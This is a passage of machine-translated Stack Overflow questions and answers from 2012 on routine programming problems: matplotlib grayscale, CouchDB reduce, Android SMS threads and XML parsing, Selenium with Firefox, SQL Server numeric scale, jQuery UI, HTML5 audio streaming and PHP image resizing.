似乎它使用灰度来表示最高（128）和最低值。我希望它使用[0:255]的灰度。我怎么做？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-10-06T14:59:41.833

Use the `vmin` and `vmax` parameters:

```
plt.imshow(bg, cmap=plt.get_cmap('gray'), vmin=0, vmax=255) 
```

Without specifying `vmin` and `vmax`, `plt.imshow` auto-adjusts its range to the min and max of the data.

* * *

I do not know of a way to set default `vmin` and `vmax` parameters for all imshow plots, but you could use `functools.partial` to prepare a custom imshow-like command with default parameters set:

```
import matplotlib.pyplot as plt
import numpy as np
import functools

bwimshow = functools.partial(plt.imshow, vmin=0, vmax=255,
                             cmap=plt.get_cmap('gray'))

dots = np.random.randn(10, 10)*255
bwimshow(dots)
cbar = plt.colorbar()

plt.show() 
```

# couchdb - CouchDB 减少函数

> ID：12760801
> 
> 赞同：1
> 
> 时间：2012-10-06T14:45:50.433
> 
> 标签：couchdb, reduce

我在 CouchDB 中定义了一个 map 函数，它生成如下所示的数据：-

```
 var data =
{"total_rows":10,"offset":0,"rows":[
    {"id":"338b79f07dfe8b3877b3aa41a5bb8a58","key":"2000-06-23T23:59:00+00:00","value":{"country":"United States"}},
    {"id":"338b79f07dfe8b3877b3aa41a5bb983e","key":"2000-06-23T23:59:00+00:00","value":{"country":"Norway"}},
    {"id":"338b79f07dfe8b3877b3aa41a5ddfefe","key":"2000-06-23T23:59:00+00:00","value":{"country":"Hungary"}},
    {"id":"338b79f07dfe8b3877b3aa41a5fe29d7","key":"2000-06-23T23:59:00+00:00","value":{"country":"United States"}},
    {"id":"b6ed02fb38d6506d7371c419751e8a14","key":"2000-06-23T23:59:00+00:00","value":{"country":"Germany"}},
    {"id":"b6ed02fb38d6506d7371c419753e20b6","key":"2000-06-23T23:59:00+00:00","value":{"country":"Hungary"}},
    {"id":"b6ed02fb38d6506d7371c419755f34ad","key":"2000-06-23T23:59:00+00:00","value":{"country":"United States"}},
    {"id":"b6ed02fb38d6506d7371c419755f3e17","key":"2000-06-23T23:59:00+00:00","value":{"country":"Germany"}},
    {"id":"338b79f07dfe8b3877b3aa41a506082f","key":"2003-01-08T19:34:00+00:00","value":{"country":"United Kingdom"}},
    {"id":"9366afb036bf8b63c9f45379bbe29509","key":"2003-01-08T19:34:00+00:00","value":{"":"United Kingdom"}}
]
} 
```

我现在正在尝试创建生成如下数据的 reduce 函数：-

```
{"rows":[
{"key":"United States","value":2},
{"key":"Norway","value":1},
{"key":"Hungary","value":2},
{"key":"Germany","value":2}
{"key":"United Kingdom","value":1}

]} 
```

我需要能够在沙发上使用“StartKey”和“EndKey”参数来定义日期范围。事实证明这比我预期的要棘手。有人可以告诉我我的 reduce 函数应该是什么样子来处理这个问题吗？

问候，

卡尔斯基

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-07T08:32:08.330

# android - Android 收到带有姓名或地址的短信对话

> ID：12760802
> 
> 赞同：19
> 
> 时间：2012-10-06T14:45:59.273
> 
> 标签：android, sms

我正在开发一个 SMS 程序，我想进行对话。
我写了下面的代码，它工作正常，但我想知道它是否可以更有效

这是为了获取对话线程

```
 Uri SMS_INBOX = Uri.parse("content://sms/conversations/");
    Cursor c = getContentResolver().query(SMS_INBOX, null, null, null, "date desc");

        startManagingCursor(c);
        String[] count = new String[c.getCount()];
        String[] snippet = new String[c.getCount()];
        String[] thread_id = new String[c.getCount()];

        c.moveToFirst(); 
        for (int i = 0; i < c.getCount(); i++) {
            count[i] = c.getString(c.getColumnIndexOrThrow("msg_count"))
                    .toString();
            thread_id[i] = c.getString(c.getColumnIndexOrThrow("thread_id"))
                    .toString();
            snippet[i] = c.getString(c.getColumnIndexOrThrow("snippet"))
                    .toString();
            //Toast.makeText(getApplicationContext(), count[i] + " - " + thread_id[i]+" - "+snippet[i] , Toast.LENGTH_LONG).show();
            c.moveToNext();
        }
        c.close(); 
```

根据对话线程获取地址

```
 for(int ad = 0; ad < thread_id.length ; ad++)
    {
    Uri uri = Uri.parse("content://sms/inbox");
    String where = "thread_id="+thread_id[ad]; 
    Cursor mycursor= getContentResolver().query(uri, null, where ,null,null); 
    startManagingCursor(mycursor);

    String[] number = new String[mycursor.getCount()];

    if(mycursor.moveToFirst()){
            for(int i=0;i<mycursor.getCount();i++){
                    number[i]=mycursor.getString(mycursor.getColumnIndexOrThrow("address")).toString();

                    mycursor.moveToNext();
            }
    }
    mycursor.close(); 
```

最后检查地址（如果在联系人列表中）并添加到列表中

```
 for(int i =0 ; i < numaralar.length ;i++)
    {

    String a = numaralar[i].substring(0,1);

    if(!a.equals("+")){ kisiismi = numaralar[i]; }

    ContentResolver localContentResolver = getApplicationContext().getContentResolver();
       Cursor contactLookupCursor =  
        localContentResolver.query(
                 Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, 
                 Uri.encode(numaralar[i])), 
                 new String[] {PhoneLookup.DISPLAY_NAME, PhoneLookup._ID}, 
                 null, 
                 null, 
                 null);
        try {
        while(contactLookupCursor.moveToNext()){
             String contactName = contactLookupCursor.getString(contactLookupCursor.getColumnIndexOrThrow(PhoneLookup.DISPLAY_NAME));
             kisiismi = contactName;
         }
        }catch (Exception e) {
         kisiismi = numaralar[i].toString(); 

        }
          finally {
              //Toast.makeText(getApplicationContext(), ad + kisiismi + " " + count[ad], Toast.LENGTH_LONG).show();
              myArr.add(kisiismi);
              contactLookupCursor.close();
         }

    } 
```

有没有办法让这个过程更容易？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-23T13:58:49.947

由于它是一个简单的 SQLite 查询，并且可以以类似的方式访问联系人提供程序，因此您应该尝试通过 GROUPING 通过数字、时间戳和可能的 thrad_id 在 SQL 中完成工作，然后将结果与对联系人提供程序的查询进行匹配（也通过 SQLite）

该文档对所有可用列进行了很好的描述。 [https://developer.android.com/reference/android/provider/ContactsContract.PhoneLookupColumns.html](https://developer.android.com/reference/android/provider/ContactsContract.PhoneLookupColumns.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-12T17:07:59.707

从 KitKat 开始，我们为此提供了一个特定的 Uri `content://mms-sms/messages/byphone`：. 但在此之前，这是我们可以想出的：

```
Set<Integer> conversationIds = new HashSet<Integer>();
String numbers = "+xxxxxxxxxx,+yyyyyyyyyy";

final String[] PROJECTION = { Sms._ID, Sms.THREAD_ID };
final String SELECTION = Sms.ADDRESS + " IN (" + numbers.replaceAll("[^,]+", "?") + ")";
final String[] selectionArgs = numbers.split(",");

Cursor cursor = context.getContentResolver().query(Sms.CONTENT_URI, PROJECTION, SELECTION, selectionArgs, null);
int threadColumn = cursor.getColumnIndexOrThrow(Sms.THREAD_ID);

while (cursor.moveToNext())
  conversationIds.add(cursor.getInt(threadColumn));
cursor.close();

return conversationIds; 
```

没有简单的方法可以对 MMS 消息执行相同的操作，因为它们不会将其地址保存在数据库中，您必须分别查询每一条消息。如果您需要重复执行此操作，一个可行的解决方案是将彩信与电话号码的关系缓存在您自己的数据库中。

然后，您可以使用累积的标识符`conversationIds`来查询各个对话。请注意，如果您想合并属于同一联系人的不同覆盖，您可以重用上述相同的查询选择模式，同时传入所有 id `IN (?,...,?)`。

# ruby-on-rails-3 - selenium webdriver 2.25.0 支持的 Firefox 版本

> ID：12760803
> 
> 赞同：5
> 
> 时间：2012-10-06T14:46:01.693
> 
> 标签：ruby-on-rails-3, firefox, selenium, cucumber, capybara

我今天重新开始了一个旧的 Rails 项目。让我发疯的一个问题是我无法运行我的 javascript 测试用例，尽管我记得当我离开项目时它们都通过了。我在用

selenium-webdriver 2.25.0 水豚 1.1.2 黄瓜 1.2.1

但是当我运行测试时 Firefox 没有启动。我得到的只是

> 无法干净启动 Firefox，参数：["-silent"] (Selenium::WebDriver::Error::WebDriverError)

我想这是因为更新了 firefox，我尝试安装了几个旧版本，但它们都不起作用。selenium-webdriver 2.25.0 支持哪个版本？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-16T11:23:13.170

是的，这很烦人。我只是升级驱动程序，它通常可以解决问题：

```
bundle update selenium-webdriver 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-06T15:00:39.803

Selenium Webdriver 2.25[支持 Firefox 最高版本 17](http://code.google.com/p/selenium/source/browse/java/CHANGELOG)

# sql-server - 数字刻度如何返回一个额外的数字

> ID：12760804
> 
> 赞同：1
> 
> 时间：2012-10-06T14:46:09.673
> 
> 标签：sql-server, sql-server-2008, tsql

我有一个列，`varchar`我正在尝试将其转换为`numeric(8,2)`像这样返回它`1.00`，但它却像这样返回它`1.000`

例子：

```
 Select 
   Convert(numeric(8,2),WholesaleCost) * 2.2)
 FROM Table 
```

这返回`50.900`

似乎当我将比例缩小到`numeric(8,1)`而不是`numeric(8,2)`返回我想要的方式时，即`50.90`

有谁知道它为什么这样做？为什么要在结果中添加一个额外的比例数字？不应该是`50.9`我做的时候`numeric(8,1)`吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:55:17.197

Because you are doing `numeric(8,2) * numeric(2,1)` and the resultant datatype is `numeric(11,3)`

When multiplying two `numeric` numbers `e1 * e2` the result has precision `p1 + p2 + 1` and scale `s1 + s2` as per [Precision, Scale, and Length](http://msdn.microsoft.com/en-us/library/ms190476%28v=SQL.90%29.aspx)

# android - XML解析一个android

> ID：12760809
> 
> 赞同：-1
> 
> 时间：2012-10-06T14:46:50.243
> 
> 标签：android, xml-parsing

我正在尝试编写一个解析 xml 代码并在列表视图中写入每个节点的值的代码

我正在使用这个 XML

[http://www.iqraa.com/rss/CustomizedServices.aspx?Service=TvGuide](http://www.iqraa.com/rss/CustomizedServices.aspx?Service=TvGuide)

我尝试遵循本教程

[http://www.androidhive.info/2011/11/android-xml-parsing-tutorial](http://www.androidhive.info/2011/11/android-xml-parsing-tutorial)

但没有任何作用

请提供任何帮助:(

这是xmlparser的代码

公共类 XMLParser {

```
public XMLParser() {

}

/**
 * Getting XML from URL making HTTP request
 * 
 * @param url
 *            string
 * */
public String getXmlFromUrl(String url) {
    String xml = null;

    try {
        // defaultHttpClient
        DefaultHttpClient httpClient = new DefaultHttpClient();
        HttpPost httpPost = new HttpPost(url);
        HttpResponse httpResponse = httpClient.execute(httpPost);
        HttpEntity httpEntity = httpResponse.getEntity();
        xml = EntityUtils.toString(httpEntity);

    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    } catch (ClientProtocolException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
    // return XML
    return xml;
}

/**
 * Getting XML DOM element
 * 
 * @param XML
 *            string
 * */
public Document getDomElement(String xml) {
    Document doc = null;

    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    // dbf.setCoalescing(true);
    try {

        DocumentBuilder db = dbf.newDocumentBuilder();

        InputSource is = new InputSource();
        is.setCharacterStream(new StringReader(xml));

        doc = db.parse(is);

    } catch (ParserConfigurationException e) {
        Log.e("Error: ", e.getMessage());
        return null;
    } catch (SAXException e) {
        Log.e("Error: ", e.getMessage());
        return null;
    } catch (IOException e) {
        Log.e("Error: ", e.getMessage());
        return null;
    }

    return doc;
}

/**
 * Getting node value
 * 
 * @param elem
 *            element
 */
public final String getElementValue(Node elem) {
    Node child;
    if (elem != null) {
        if (elem.hasChildNodes()) {
            for (child = elem.getFirstChild(); child != null; child = child
                    .getNextSibling()) {
                if (child.getNodeType() == Node.TEXT_NODE) {
                    return child.getNodeValue();
                }
            }
        }
    }
    return "";
}

/**
 * Getting node value
 * 
 * @param Element
 *            node
 * @param key
 *            string
 * */
public String getValue(Element item, String str) {
    NodeList n = item.getElementsByTagName(str);
    return this.getElementValue(n.item(0));
} 
```

}

这是 MainActivity 的代码

公共类 MainActivity 扩展 ListActivity {

```
static final String URL = "http://iqraa.com/rss/CustomizedServices.aspx?Service=TvGuide";
// XML node keys
static final String KEY_PITEM = "ProgramItem"; // parent node

static final String KEY_PNAME = "ProgramName";
static final String KEY_LINK = "Link";
static final String KEY_STARTTIME = "StartTime";
static final String KEY_CHANNEL = "Channel";
static final String KEY_SCHEDULE = "ScheduleDate";
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    ArrayList<HashMap<String, String>> menuItems = new ArrayList<HashMap<String, String>>();

    XMLParser parser = new XMLParser();
    String xml = parser.getXmlFromUrl(URL); // getting XML

    Log.i("Inside 1  Oncreate", "On create done");
    Document doc = parser.getDomElement(xml); // getting DOM element

    NodeList nl = doc.getElementsByTagName(KEY_PITEM);

    // looping through all item nodes <item>
    for (int i = 0; i < nl.getLength(); i++) {
        // creating new HashMap
        HashMap<String, String> map = new HashMap<String, String>();
        Element e = (Element) nl.item(i);
        // adding each child node to HashMap key => value
        map.put(KEY_PNAME, parser.getValue(e, KEY_PNAME));
        //map.put(KEY_LINK, parser.getValue(e, KEY_LINK));
        Log.i("Inside 1  Oncreate", "FOR LOOOOOOP ");
        map.put(KEY_STARTTIME,parser.getValue(e, KEY_STARTTIME));
        map.put(KEY_CHANNEL,parser.getValue(e, KEY_CHANNEL));
        map.put(KEY_SCHEDULE, parser.getValue(e, KEY_SCHEDULE));

        // adding HashList to ArrayList
        menuItems.add(map);
    }

    // Adding menuItems to ListView
    ListAdapter adapter = new SimpleAdapter(this, menuItems,
            R.layout.list_item,
            new String[] { KEY_PNAME, KEY_STARTTIME, KEY_CHANNEL}, new int[] {
                    R.id.name, R.id.stime, R.id.channel });
    Log.i("Inside 3  Oncreate", "2222222");

    setListAdapter(adapter);

    // selecting single ListView item
    ListView lv = getListView();

    lv.setOnItemClickListener(new OnItemClickListener() {

        public void onItemClick(AdapterView<?> parent, View view,
                int position, long id) {
            // getting values from selected ListItem
            Log.i("Inside 1  Oncreate", "44444444");
            String name = ((TextView) view.findViewById(R.id.name)).getText().toString();
            String channel = ((TextView) view.findViewById(R.id.channel)).getText().toString();
            String stime = ((TextView) view.findViewById(R.id.stime)).getText().toString();

            // Starting new intent
            Intent in = new Intent(getApplicationContext(), SingleMenuItemActivity.class);
            in.putExtra(KEY_PNAME, name);
            in.putExtra(KEY_CHANNEL, channel);
            in.putExtra(KEY_STARTTIME, stime);
            startActivity(in);

        }
    });

} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T12:06:45.717

```
you have to add permissions for this parsing xml in manifest.

add this line in Manifest file
 <uses-permission android:name="android.permission.INTERNET"/>

See your activity class here Now it is working  fine.Run this Example in Device,for  Emulator check permissions may be there are any restrictions.

package com.rmn.xmlparser;

import java.util.ArrayList;
import java.util.HashMap;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;

public class ListxmlActivity extends Activity {
    static final String URL = "http://iqraa.com/rss/CustomizedServices.aspx?Service=TvGuide";
    // XML node keys
    static final String KEY_PITEM = "ProgramItem"; // parent node

    static final String KEY_PNAME = "ProgramName";
    static final String KEY_LINK = "Link";
    static final String KEY_STARTTIME = "StartTime";
    static final String KEY_CHANNEL = "Channel";
    static final String KEY_SCHEDULE = "ScheduleDate";
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        ArrayList<HashMap<String, String>> menuItems = new ArrayList<HashMap<String, String>>();
        // selecting single ListView item
        ListView lv =(ListView) findViewById(R.id.list);

        XMLParser parser = new XMLParser();
        String xml = parser.getXmlFromUrl(URL); // getting XML from URL
        Document doc = parser.getDomElement(xml); // getting DOM element

        NodeList nl = doc.getElementsByTagName(KEY_PITEM);

        // looping through all item nodes <item>
        for (int i = 0; i < nl.getLength(); i++) {
            // creating new HashMap
            HashMap<String, String> map = new HashMap<String, String>();
            Element e = (Element) nl.item(i);
            // adding each child node to HashMap key => value
            map.put(KEY_PNAME, parser.getValue(e, KEY_PNAME));
            map.put(KEY_STARTTIME,parser.getValue(e, KEY_STARTTIME));
            map.put(KEY_CHANNEL,parser.getValue(e, KEY_CHANNEL));
            map.put(KEY_SCHEDULE, parser.getValue(e, KEY_SCHEDULE));

            // adding HashList to ArrayList
            menuItems.add(map);
        }

        // Adding menuItems to ListView
        ListAdapter adapter = new SimpleAdapter(this, menuItems,
                R.layout.list_item,
                new String[] { KEY_PNAME, KEY_STARTTIME, KEY_CHANNEL}, new int[] {
                        R.id.name, R.id.stime, R.id.channel });
        Log.i("Inside 3  Oncreate", "2222222");

        lv.setAdapter(adapter);

        lv.setOnItemClickListener(new OnItemClickListener() {

            public void onItemClick(AdapterView<?> parent, View view,
                    int position, long id) {
                // getting values from selected ListItem
                Log.i("Inside 1  Oncreate", "44444444");
                String name = ((TextView) view.findViewById(R.id.name)).getText().toString();
                String channel = ((TextView) view.findViewById(R.id.channel)).getText().toString();
                String stime = ((TextView) view.findViewById(R.id.stime)).getText().toString();

                // Starting new intent
                Intent in = new Intent(getApplicationContext(), SingleMenuItemActivity.class);
                in.putExtra(KEY_PNAME, name);
                in.putExtra(KEY_CHANNEL, channel);
                in.putExtra(KEY_STARTTIME, stime);
                startActivity(in);

            }
        });

    }
} 
```

# javascript - 使用 jQuery 可拖动和调整大小来绘制元素

> ID：12760810
> 
> 赞同：2
> 
> 时间：2012-10-06T14:46:57.103
> 
> 标签：javascript, jquery-ui, jquery-ui-draggable, jquery-ui-resizable

我试图弄清楚如何使用可拖动和可调整大小的 jQuery 库来绘制 div。我发现[这](http://jsfiddle.net/7bJak/2/) 非常好，但我真的希望这个功能可以与上述库一起使用。更具体地说，我希望能够创建一个可拖动的元素并一次拖动（调整大小）它。这可能吗？

编辑：当“创建”事件以可拖动或可调整大小发生时，也许我需要做点什么？我需要以某种方式将鼠标放在可调整大小的角落上吗？在您实际抬起鼠标然后在调整大小角上按下并拖动之前，调整大小似乎不会打开。这是我现在拥有的代码：

```
 $('.container').live('mousedown', function(){
    $('.container').append('<div class="gen-box"></div>');
    $('.gen-box').resizable().draggable();
 }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T16:14:17.567

我会以不同的方式处理这个问题——我会使用 jQueryUI[`selectable`](http://jqueryui.com/demos/selectable/)组件之类的东西，它已经提供了装箱方法。它具有暴露鼠标坐标的事件`start`。`stop`基于此，您可以`stop`使用所需的鼠标坐标在事件上创建一个 div，然后向该 div 添加可调整大小和可拖动的。

反正我就是这样做的。

您的另一个选择是完全按照您正在做的事情，并尝试使用 jQuery [`trigger()`](http://api.jquery.com/trigger/)，如下所示：

```
 $('.container').live('mousedown', function(){
    $('.container').append('<div class="gen-box"></div>');
    $('.gen-box').resizable().draggable();
    $('.gen-box').trigger('mousedown'); // This may activate the resize ability, but you may need to target the resize handle, instead of the full div.
 }); 
```

这似乎应该可行，但可能存在一些问题（我从 2008 年开始[在这里](https://groups.google.com/forum/?fromgroups=#!msg/jquery-ui/O7Fbla-FGwU/TNIqvEj1_9cJ)遇到一个线程）。不过，这可能有助于您走上正确的道路。祝你好运。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-09T19:28:00.970

好的，我终于想通了。我根据@lunchmeat317 的建议使用了 selectable() 。我能够在可选事件期间捕获鼠标位置：“开始”和“停止”创建一个具有正确宽度、高度和位置的 div。这是[jsfiddle](http://jsfiddle.net/XELRX/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T15:05:13.790

[使用jquery ui 库](http://jqueryui.com/demos/draggable/)可以轻松实现拖动和调整大小的 div 。

你可以试试这个例子。下载最新的 JQuery 和 JQuery ui 库并调整示例中的源路径。要调整大小，您可以使用 resize 函数。

```
<!DOCTYPE html>
<html lang="en">

  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Title</title>

    <script type="text/javascript" src="/media/js/jquery-latest.js"></script>
    <script type="text/javascript" src="/media/js/jquery-ui-latest.js"></script>

    <script type="text/javascript">
      $(document).ready(function() {        
        $( '#test' ).draggable();
      });
    </script>
  </head>

  <body>

    <div id="test" style="width: 100px; height: 50px; background-color: red;" >
      <p>Drag me</p>
    </div>

  </body>

</html> 
```

# html - 在 Chrome 和 Firefox 中使用音频 html5 标签开始播放新歌曲时停止播放流音乐

> ID：12760812
> 
> 赞同：5
> 
> 时间：2012-10-06T14:47:14.393
> 
> 标签：html, mp3, playback, html5-audio, ogg

我已经设置了一个 IceCast2 服务器，它能够以 192 kbps 的速度传输 ogg 或 mp3。

在我使用的html中：

```
<audio controls autoplay>
    <source src="http://site.com:8000/mount1.ogg" type="audio/ogg">
    <source src="http://site.com:8000/mount2.mp3" type="audio/mp3">
    Your browser does not support the audio element.
</audio> 
```

但在 Chrome 22 / Firefox 13 中，每当一首新歌开始播放时，播放器就会停止播放。在 IE10 中它继续播放没有任何问题。我认为这可能与 Chrome 和 Firefox 使用 ogg 源而 IE 使用 mp3 的事实有关。Opera 12在播放192 kbps时似乎也有问题（听到音乐被扫视），我切换到128然后它可以流畅地运行。

有人知道解决这个问题吗？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-07T17:06:40.337

将此作为临时黑客发布，直到有人给出更好的答案。

在 Chrome`MEDIA_ERR_DECODE`中播放停止时抛出，而在 Firefox 中它只是停止而没有任何错误。

我更改了`src`to`currentSrc`然后调用`play()`了事件`onerror`，`onended`但声音有时会在恢复播放之前中断。一定会有更好的办法。

```
/* jQuery - run on document ready */
$(function ()
{
    var audioElement = $('#audioPlayer')[0];

    audioElement.onended = audioElement.onerror = function()
    {
        audioElement.src = audioElement.currentSrc;
        audioElement.play();
    };
}); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-05-14T11:31:48.417

你不必做上面提到的那么多事情^我在你的代码中看到的唯一问题是你刚刚写了自动播放。你必须让它 autoplay=true;

# php - PHP在上传错误时调整图像大小

> ID：12760827
> 
> 赞同：1
> 
> 时间：2012-10-06T14:50:16.420
> 
> 标签：php, upload, image-resizing

我目前有一个上传脚本，它将图像名称保存在数据库中，但是，我想在上传时调整图像大小我目前有这个脚本，但它产生了一些错误

这是脚本：

```
$imagename = $image['name'];

$path = "img/users/$category/$user_id/$imagename";

// *** 1) Initialise / load image
$resizeObj = new resize('$path');

// *** 2) Resize image (options: exact, portrait, landscape, auto, crop)
$resizeObj -> resizeImage(200, 200, 'crop');

// *** 3) Save image
$resizeObj -> saveImage('$path', 1000);

echo $path; 
```

这些是错误：

```
 Warning: imagesx() expects parameter 1 to be resource, boolean given in /home/stude295/public_html/resize-class.php on line 34

Warning: imagesy() expects parameter 1 to be resource, boolean given in /home/stude295/public_html/resize-class.php on line 35

Warning: Division by zero in /home/stude295/public_html/resize-class.php on line 182

Warning: Division by zero in /home/stude295/public_html/resize-class.php on line 183

Warning: imagecreatetruecolor() [function.imagecreatetruecolor]: Invalid image dimensions in /home/stude295/public_html/resize-class.php on line 76

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /home/stude295/public_html/resize-class.php on line 77

Warning: imagecopyresampled() expects parameter 2 to be resource, boolean given in /home/stude295/public_html/resize-class.php on line 201
img/users/Accessories/admin/IMG_2029.JPG 
```

调整大小类文件：

```
 # ========================================================================#
   #
   #  Author:    Jarrod Oberto
   #  Version:   1.0
   #  Date:      17-Jan-10
   #  Purpose:   Resizes and saves image
   #  Requires : Requires PHP5, GD library.
   #  Usage Example:
   #                     include("classes/resize_class.php");
   #                     $resizeObj = new resize('images/cars/large/input.jpg');
   #                     $resizeObj -> resizeImage(150, 100, 0);
   #                     $resizeObj -> saveImage('images/cars/large/output.jpg', 100);
   #
   #
   # ========================================================================#

        Class resize
        {
            // *** Class variables
            private $image;
            private $width;
            private $height;
            private $imageResized;

            function __construct($fileName)
            {
                // *** Open up the file
                $this->image = $this->openImage($fileName);

                // *** Get width and height
                $this->width  = imagesx($this->image);
                $this->height = imagesy($this->image);
            }

            ## --------------------------------------------------------

            private function openImage($file)
            {
                // *** Get extension
                $extension = strtolower(strrchr($file, '.'));

                switch($extension)
                {
                    case '.jpg':
                    case '.jpeg':
                        $img = @imagecreatefromjpeg($file);
                        break;
                    case '.gif':
                        $img = @imagecreatefromgif($file);
                        break;
                    case '.png':
                        $img = @imagecreatefrompng($file);
                        break;
                    default:
                        $img = false;
                        break;
                }
                return $img;
            }

            ## --------------------------------------------------------

            public function resizeImage($newWidth, $newHeight, $option="auto")
            {
                // *** Get optimal width and height - based on $option
                $optionArray = $this->getDimensions($newWidth, $newHeight, $option);

                $optimalWidth  = $optionArray['optimalWidth'];
                $optimalHeight = $optionArray['optimalHeight'];

                // *** Resample - create image canvas of x, y size
                $this->imageResized = imagecreatetruecolor($optimalWidth, $optimalHeight);
                imagecopyresampled($this->imageResized, $this->image, 0, 0, 0, 0, $optimalWidth, $optimalHeight, $this->width, $this->height);

                // *** if option is 'crop', then crop too
                if ($option == 'crop') {
                    $this->crop($optimalWidth, $optimalHeight, $newWidth, $newHeight);
                }
            }

            ## --------------------------------------------------------

            private function getDimensions($newWidth, $newHeight, $option)
            {

               switch ($option)
                {
                    case 'exact':
                        $optimalWidth = $newWidth;
                        $optimalHeight= $newHeight;
                        break;
                    case 'portrait':
                        $optimalWidth = $this->getSizeByFixedHeight($newHeight);
                        $optimalHeight= $newHeight;
                        break;
                    case 'landscape':
                        $optimalWidth = $newWidth;
                        $optimalHeight= $this->getSizeByFixedWidth($newWidth);
                        break;
                    case 'auto':
                        $optionArray = $this->getSizeByAuto($newWidth, $newHeight);
                        $optimalWidth = $optionArray['optimalWidth'];
                        $optimalHeight = $optionArray['optimalHeight'];
                        break;
                    case 'crop':
                        $optionArray = $this->getOptimalCrop($newWidth, $newHeight);
                        $optimalWidth = $optionArray['optimalWidth'];
                        $optimalHeight = $optionArray['optimalHeight'];
                        break;
                }
                return array('optimalWidth' => $optimalWidth, 'optimalHeight' => $optimalHeight);
            }

            ## --------------------------------------------------------

            private function getSizeByFixedHeight($newHeight)
            {
                $ratio = $this->width / $this->height;
                $newWidth = $newHeight * $ratio;
                return $newWidth;
            }

            private function getSizeByFixedWidth($newWidth)
            {
                $ratio = $this->height / $this->width;
                $newHeight = $newWidth * $ratio;
                return $newHeight;
            }

            private function getSizeByAuto($newWidth, $newHeight)
            {
                if ($this->height < $this->width)
                // *** Image to be resized is wider (landscape)
                {
                    $optimalWidth = $newWidth;
                    $optimalHeight= $this->getSizeByFixedWidth($newWidth);
                }
                elseif ($this->height > $this->width)
                // *** Image to be resized is taller (portrait)
                {
                    $optimalWidth = $this->getSizeByFixedHeight($newHeight);
                    $optimalHeight= $newHeight;
                }
                else
                // *** Image to be resizerd is a square
                {
                    if ($newHeight < $newWidth) {
                        $optimalWidth = $newWidth;
                        $optimalHeight= $this->getSizeByFixedWidth($newWidth);
                    } else if ($newHeight > $newWidth) {
                        $optimalWidth = $this->getSizeByFixedHeight($newHeight);
                        $optimalHeight= $newHeight;
                    } else {
                        // *** Sqaure being resized to a square
                        $optimalWidth = $newWidth;
                        $optimalHeight= $newHeight;
                    }
                }

                return array('optimalWidth' => $optimalWidth, 'optimalHeight' => $optimalHeight);
            }

            ## --------------------------------------------------------

            private function getOptimalCrop($newWidth, $newHeight)
            {

                $heightRatio = $this->height / $newHeight;
                $widthRatio  = $this->width /  $newWidth;

                if ($heightRatio < $widthRatio) {
                    $optimalRatio = $heightRatio;
                } else {
                    $optimalRatio = $widthRatio;
                }

                $optimalHeight = $this->height / $optimalRatio;
                $optimalWidth  = $this->width  / $optimalRatio;

                return array('optimalWidth' => $optimalWidth, 'optimalHeight' => $optimalHeight);
            }

            ## --------------------------------------------------------

            private function crop($optimalWidth, $optimalHeight, $newWidth, $newHeight)
            {
                // *** Find center - this will be used for the crop
                $cropStartX = ( $optimalWidth / 2) - ( $newWidth /2 );
                $cropStartY = ( $optimalHeight/ 2) - ( $newHeight/2 );

                $crop = $this->imageResized;
                //imagedestroy($this->imageResized);

                // *** Now crop from center to exact requested size
                $this->imageResized = imagecreatetruecolor($newWidth , $newHeight);
                imagecopyresampled($this->imageResized, $crop , 0, 0, $cropStartX, $cropStartY, $newWidth, $newHeight , $newWidth, $newHeight);
            }

            ## --------------------------------------------------------

            public function saveImage($savePath, $imageQuality="100")
            {
                // *** Get extension
                $extension = strrchr($savePath, '.');
                $extension = strtolower($extension);

                switch($extension)
                {
                    case '.jpg':
                    case '.jpeg':
                        if (imagetypes() & IMG_JPG) {
                            imagejpeg($this->imageResized, $savePath, $imageQuality);
                        }
                        break;

                    case '.gif':
                        if (imagetypes() & IMG_GIF) {
                            imagegif($this->imageResized, $savePath);
                        }
                        break;

                    case '.png':
                        // *** Scale quality from 0-100 to 0-9
                        $scaleQuality = round(($imageQuality/100) * 9);

                        // *** Invert quality setting as 0 is best, not 9
                        $invertScaleQuality = 9 - $scaleQuality;

                        if (imagetypes() & IMG_PNG) {
                             imagepng($this->imageResized, $savePath, $invertScaleQuality);
                        }
                        break;

                    // ... etc

                    default:
                        // *** No extension - No save.
                        break;
                }

                imagedestroy($this->imageResized);
            }

            ## --------------------------------------------------------

        }
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:07:58.970

这一行是错误的：

```
$resizeObj = new resize('$path'); 
```

相反，请尝试删除单引号：

```
$resizeObj = new resize($path); 
```

* * *

> 你知道我将如何使用 IF 语句检查文件大小（以 px 为单位）是否大于某个大小？

```
if ($resizeObj->width > 800)
{
    // bigger than 800 pixels in width
}

if ($resizeObj->height > 600)
{
    // bigger than 600 pixels in height
} 
```

* * *

